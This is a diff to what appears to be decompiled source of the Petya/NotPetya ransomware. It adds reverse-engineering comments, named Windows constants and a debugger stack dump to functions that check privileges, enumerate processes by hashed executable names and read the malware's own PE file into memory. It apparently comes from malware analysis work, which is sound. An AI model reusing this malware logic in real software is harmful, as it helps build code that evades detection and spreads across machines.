@@ -40,7 +40,8 @@ BOOL byte_681FFF4C = 1; // weak
 int(__stdcall *off_6820B104)(_DWORD) = &CreateHeap; // weak
 
 __int16 word_6820F0F8; // weak
-int dword_6820F0FC; // idb
+//int dword_6820F0FC; // idb // orig // globalbuffer?
+void * dword_6820F0FC
 LPWSTR lpMem; // idb
 int EnumeratedProcessesHandle; // weak
 LPCRITICAL_SECTION lpCriticalSection; // idb
@@ -6295,7 +6296,7 @@ void PerformPrivChecks()
 			PrivLevel |= 4u;
 		gPrivLevel = PrivLevel;
 		EnumeratedProcessesHandle = EnumerateProcesses();
-		if (GetModuleFileNameW(Src, &pszPath, 0x30Cu))
+		if (GetModuleFileNameW(Src, &pszPath, 0x30Cu)) // Src is the FileImage of the process// pszPath is a buffer for path // 780 
 			CreateSomeFile();
 	}
 }
@@ -6372,7 +6373,7 @@ void  perfc_1(__m64 a1, __m64 a2, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE
 	HANDLE Token; // [esp+4A20h] [ebp-4h]
 
 	PerformPrivChecks();
-	if (hThread != -1)
+	if (hThread != (HANDLE)-1)
 		SetVirtualAttributes(a3, dwErrCode, Thread);
 	WSAStartup(0x202u, &stru_6820F768);
 	lpParameter = sub_681F7091(36, CompareStringsW, 0, 0xFFFF);
@@ -6804,10 +6805,10 @@ int EnumerateProcesses()
 	int v10; // [esp+234h] [ebp-4h]
 
 	v10 = -1;
-	hSnapshot = CreateToolhelp32Snapshot(2u, 0);
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hSnapshot != INVALID_HANDLE_VALUE)
 	{
-		pe.dwSize = 556;
+		pe.dwSize = 556; // 0x238 stack is subbed this -2
 		if (Process32FirstW(hSnapshot, &pe))
 		{
 			do
@@ -6818,12 +6819,12 @@ int EnumerateProcesses()
 				do
 				{
 					v2 = 0;
-					if (v1)
+					if (v1) // If Process Found? 
 					{
-						v3 = v0;
+						v3 = v0; //MD ARRAY
 						do
 						{
-							v4 = &v9 + (v3 & 3);
+							v4 = &v9 + (v3 & 3);				// Iterates through each found item one byte by byte// char *?
 							v5 = (*v4 ^ LOBYTE(pe.szExeFile[v2++])) - 1;
 							++v3;
 							*v4 = v5;
@@ -6839,9 +6840,9 @@ int EnumerateProcesses()
 				{
 					v10 &= 0xFFFFFFFB;
 				}
-			} while (Process32NextW(hSnapshot, &pe));
+			} while (Process32NextW(hSnapshot, &pe)); // Get Next Process.
 		}
-		CloseHandle(hSnapshot);
+		CloseHandle(hSnapshot); // Closes the HSnapshot handle
 	}
 	return v10;
 }
@@ -6944,7 +6945,7 @@ unsigned int __stdcall EnumerateProcessesAndTokens(int a1)
 }
 
 //----- (681F8946) --------------------------------------------------------
-signed int  CreateSomeFile_2(DWORD a1, const WCHAR *lpFileName, LPCVOID lpBuffer, DWORD NumberOfBytesWritten)
+signed int  CreateSomeFile_2(DWORD a1, const WCHAR *lpFileName, LPCVOID lpBuffer, DWORD NumberOfBytesWritten) 
 {
 	signed int v4; // esi
 	HANDLE v5; // edi
@@ -7056,11 +7057,12 @@ signed int CreateSomeFile()
 	DWORD NumberOfBytesRead; // [esp+Ch] [ebp-4h]
 
 	v8 = 0;
-	v0 = CreateFileW(&pszPath, 0x80000000, 1u, 0, 3u, 0, 0);
+	//v0 = CreateFileW(&pszPath, 0x80000000, 1u, 0, 3u, 0, 0);//orig
+	v0 = CreateFileW(&pszPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
 	hFile = v0;
-	if (v0 != -1)
+	if (v0 != INVALID_HANDLE_VALUE) // FILE HANDLE For me 300
 	{
-		v1 = GetFileSize(v0, 0);
+		v1 = GetFileSize(v0, 0);// file handle // clean after all is intellifixed
 		v2 = v1;
 		if (v1)
 		{
@@ -7070,14 +7072,24 @@ signed int CreateSomeFile()
 			if (v5)
 			{
 				NumberOfBytesRead = 0;
+
+				/*
+				CPU Stack
+				Address   Value      ASCII Comments
+				02F5AE54  /00000300       ; |hFile = 00000300
+				02F5AE58  |03286B38  8k(  ; |Buffer = 03286B38 -> C0
+				02F5AE5C  |00058778  x‡   ; |Size = 362360.
+				02F5AE60  |02F5AE7C  |®õ  ; |pBytesRead = 02F5AE7C -> 0
+				02F5AE64  |00000000        ; \pOverlapped = NULL
+				*/
 				if (ReadFile(hFile, v5, v2, &NumberOfBytesRead, 0) || NumberOfBytesRead != v2)
 				{
-					dword_6820F0FC = v5;
-					dword_6820F11C = v2;
+					dword_6820F0FC = v5;// Buffer holding Whole PE FILE
+					dword_6820F11C = v2;// NumberOfBytesRead
 					v8 = 1;
 				}
 				else
-				{
+				{ // Never landed?
 					v6 = GetProcessHeap();
 					HeapFree(v6, 0, v5);
 				}
